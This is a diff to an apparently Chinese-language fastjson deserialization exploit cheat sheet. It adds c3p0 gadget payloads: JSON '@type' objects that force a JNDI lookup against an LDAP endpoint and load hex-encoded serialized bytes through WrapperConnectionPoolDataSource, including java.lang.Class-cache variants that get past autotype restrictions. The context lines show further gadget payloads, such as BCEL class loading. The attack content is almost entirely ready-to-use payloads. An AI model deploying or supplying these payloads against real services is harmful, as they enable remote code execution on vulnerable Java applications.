@@ -160,6 +160,35 @@ cmd: whoami
 }
 ```
 
+## c3p0
+
+```xml
+<dependency>
+    <groupId>com.mchange</groupId>
+    <artifactId>c3p0</artifactId>
+    <version>0.9.5.2</version>
+</dependency>
+```
+
+`com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource` JNDI
+
+```json
+{
+    "@type":"com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource",
+    "JndiName":"ldap://127.0.0.1:1389/kobnqy",
+    "LoginTimeout":0
+}
+```
+
+`com.mchange.v2.c3p0.WrapperConnectionPoolDataSource` HEX 类字节码加载，结合其他反序列化利用链
+
+```json
+{
+        "@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
+        "userOverridesAsString": "HexAsciiSerializedMap:ACED0005737200116A61;"
+}
+```
+
 # fastjson 1.2.25-1.2.32 反序列化
 
 来自雨了个雨师傅的研究，进行一下整合
@@ -385,6 +414,47 @@ cmd: whoami
 
 
 {"@type":"com.alibaba.fastjson.JSONObject","name":{"@type":"java.lang.Class","val":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource"},"c":{"@type":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource","key":{"@type":"java.lang.Class","val":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassLoader":{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driver":"{$$BCEL$$..}"}}
+```
+
+## c3p0
+
+```xml
+<dependency>
+    <groupId>com.mchange</groupId>
+    <artifactId>c3p0</artifactId>
+    <version>0.9.5.2</version>
+</dependency>
+```
+
+`com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource` JNDI
+
+```json
+{
+  "a":{
+    "@type":"java.lang.Class",
+    "val":"com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource"
+  },
+  "b":{
+    "@type":"com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource",
+    "JndiName":"ldap://127.0.0.1:1389/kobnqy",
+    "LoginTimeout":0
+  }
+}
+```
+
+`com.mchange.v2.c3p0.WrapperConnectionPoolDataSource` HEX 类字节码加载，结合其他反序列化利用链
+
+```json
+{
+    "a": {
+        "@type": "java.lang.Class",
+        "val": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"
+    },
+    "b": {
+        "@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
+        "userOverridesAsString": "HexAsciiSerializedMap:ACED0005737200116A61;"
+    }
+}
 ```
 
 # Fastjson 1.2.36 - 1.2.62 远程拒绝服务
